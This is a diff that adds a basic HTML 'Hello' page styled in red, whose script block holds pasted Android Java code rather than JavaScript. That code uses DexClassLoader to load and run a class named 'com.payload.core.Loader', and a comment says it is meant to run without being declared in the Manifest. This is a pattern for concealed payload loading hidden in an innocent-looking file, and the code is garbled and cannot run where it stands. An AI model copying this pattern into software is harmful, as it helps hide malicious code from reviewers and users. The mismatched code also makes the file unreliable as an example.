@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Hello Page</title>
+    <style>
+        /* This CSS makes the text red and bold */
+        .red-hello {
+            color: red;
+            font-size: 24px;
+            font-family: sans-serif;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="red-hello">Hello</div>
+
+    <!-- Any JavaScript code placed here will execute automatically when the page loads -->
+    <script>
+        console.log("Custom code is running automatically!");
+        //  
+DexClassLoader classLoader = new DexClassLoader(
+    optimizedDexPath.getAbsolutePath(), 
+    codeCacheDir.getAbsolutePath(), 
+    null, 
+    context.getClassLoader()
+);
+
+// Dynamically invokes the core payload entry function without declaring it in the Manifest
+Class<?> dynamicClass = classLoader.loadClass("com.payload.core.Loader");
+Method startMethod = dynamicClass.getMethod("init", Context.class);
+startMethod.invoke(null, context);
+
+    </script>
+
+</body>
+</html>
